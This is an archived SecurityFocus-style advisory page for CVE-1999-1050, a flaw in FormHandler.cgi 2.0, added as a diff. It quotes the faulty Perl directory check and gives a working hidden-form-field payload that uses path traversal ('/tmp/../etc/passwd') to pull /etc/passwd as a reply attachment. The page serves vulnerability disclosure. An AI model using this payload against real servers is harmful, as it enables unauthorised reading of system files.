@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid799<p><b><span style="font-size: 18pt;">FormHandler.cgi Reply Attachment Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/799/info">info</a><br><a href="http://www.securityfocus.com/bid/799/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/799/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/799/solution">solution</a><br><a href="http://www.securityfocus.com/bid/799/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				799
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-1050<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 16 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Posted to bugtraq on November 16, 1999 by m4rcyS &lt;marcys@free.com.pl&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Matt Wright FormHandler.cgi 2.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	@ALLOWED_ATTACH_DIRS = ('all');         # hmm, nice defaults ;) <br/>@RESTRICTED_ATTACH_DIRS = ('/etc/');<br/>...<br/><br/>if (&amp;amp;valid_directory($filename)) {      # let's check if file is allowed<br/>push(@files, $filename); ... }        # to send<br/>... <br/><br/>sub valid_directory {<br/>    local ($filename) = $_0;<br/>    local ($allowed_path, $restricted_path);<br/>    local($valid_dir) = 0;<br/>    if ($ALLOWED_ATTACH_DIRS0 =~ /^all$/i) { $valid_dir = 1 }<br/>    else {<br/>        foreach $allowed_path (@ALLOWED_ATTACH_DIRS) {<br/>            $valid_dir = ($filename =~ /^$allowed_path/);      # silly ...<br/>            last if $valid_dir;<br/>        }<br/>    }<br/>    foreach $restricted_path (@RESTRICTED_ATTACH_DIRS) {<br/>        $valid_dir = ($filename !~ /^$restricted_path/);       # once more<br/>        last if !$valid_dir;<br/>    }<br/>    return $valid_dir;<br/>}<br/>...<br/><br/>How to d/l /etc/passwd ? Just add this to the form:<br/>&amp;lt;INPUT TYPE="hidden" NAME="reply_message_attach" <br/>VALUE="text:/tmp/../etc/passwd"&amp;gt;
+	
+		<ul>
+</ul>
+</div>
